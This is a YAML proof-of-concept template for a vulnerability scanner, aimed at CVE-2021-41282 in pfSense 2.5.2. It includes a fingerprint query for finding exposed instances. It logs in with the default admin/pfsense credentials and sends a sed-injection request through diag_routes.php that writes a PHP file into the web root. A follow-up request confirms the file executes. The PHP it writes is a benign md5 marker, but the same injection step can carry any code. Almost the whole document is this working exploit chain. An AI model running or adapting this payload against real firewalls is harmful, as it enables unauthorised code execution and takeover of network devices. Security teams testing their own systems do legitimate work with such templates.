name: poc-yaml-pfsense-rce-cve-2021-41282
binding: d07c6536-fb0e-42a8-b279-a39a164187a5
manual: true
detail:
    author: Aurora
    links:
        - https://blog.csdn.net/qq_69775412/article/details/125292589
    description: diag_routes.php in pfSense 2.5.2 allows sed data injection. The data is retrieved by executing the netstat utility, and then its output is parsed via the sed utility.
    extra:
        dock: |
            (banner="pfSense " && protocol="snmp") || body="https://www.pfsense.org/?gui=bootstrap"
            || body="Rubicon Communications, LLC (Netgate)" || body="<h4>Login to pfSense</h4>"
            ||(body="<title id=\"pfsense-logo-svg\">pfSense Logo</title>" && body="CsrfMagic.end")
        product: pfsense
        homepage: www.pfsense.org
    vulnerability:
        id: CT-390983
        level: high
    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
transport: http
set:
    r1: randomInt(10000000, 20000000)
    rFilename: randomLowercase(6)
rules:
    r1:
        request:
            method: GET
            path: /index.php
            follow_redirects: false
        expression: response.status == 200
        output:
            search_csrfToken: '"(?P<csrfToken>sid:[a-z0-9,;:]+)".bsubmatch(response.body)'
            var_csrfToken: search_csrfToken["csrfToken"]
    r2:
        request:
            method: POST
            path: /index.php
            follow_redirects: false
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: __csrf_magic={{var_csrfToken}}&usernamefld=admin&passwordfld=pfsense&login=Sign+In
        expression: 'response.status == 302 && response.raw_header.bcontains(b"Location: /")'
    r3:
        request:
            method: GET
            path: /diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\x3c\x3fphp+var_dump(md5({{r1}}));unlink(__FILE__)\x3b\x3f\x3e/;w+/usr/local/www/{{rFilename}}.php%0a%23
            follow_redirects: false
        expression: response.status == 200
    r4:
        request:
            method: GET
            path: /{{rFilename}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
expression: r1() && r2() && r3() && r4()
